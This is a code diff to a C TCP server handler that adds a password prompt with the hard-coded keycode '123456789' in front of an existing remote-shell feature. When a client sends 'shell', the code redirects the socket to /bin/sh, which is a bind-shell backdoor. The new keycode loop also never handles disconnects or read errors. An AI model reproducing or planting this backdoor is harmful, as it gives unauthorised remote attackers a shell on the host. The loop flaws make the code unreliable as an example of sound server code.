@@ -9,25 +9,37 @@ void *handle_client(void *arg)
 {
     int client_socket = *(int *)arg;
 
-    char buffer[1024] = {0};
+    char buffer[1024];
+    char keycode[1024] = "123456789";
 
-    send(client_socket, "Connection established\n", strlen("Connection established\n"), 0);
-  
+    memset(buffer, 0, 1024);
+    send(client_socket, "Enter the keycode\n", strlen("Enter the keycode\n"), 0);
+    while (1) {
+        ssize_t valread = read(client_socket, buffer, sizeof(keycode) - 1);
+        if (!strncmp(buffer, keycode, strlen(keycode))) {
+            send(client_socket, "Connection established, welcome\n", strlen("Connection established, welcome\n"), 0);
+            break ;
+        } else {
+            send(client_socket, "Connection failed\n", strlen("Connection failed\n"), 0);
+        }
+    }
+
+    memset(buffer, 0, 1024);
     while (1) {
         ssize_t valread = read(client_socket, buffer, sizeof(buffer) - 1);
         if (valread <= 0) {
             break;
         }
-
         buffer[valread] = '\0';
         printf("Received: %s\n", buffer);
-
         if (!strncmp(buffer, "shell", strlen("shell"))) {
             dup2(client_socket, 0);
             dup2(client_socket, 1);
             dup2(client_socket, 2);
             char * const argv[] = {"/bin/sh", NULL};
             execve("/bin/sh", argv, NULL);
+        } else {
+            send(client_socket, "Connection established\n", strlen("Connection established\n"), 0);
         }
         if (!strncmp(buffer, "quit", 4)) {
             break;
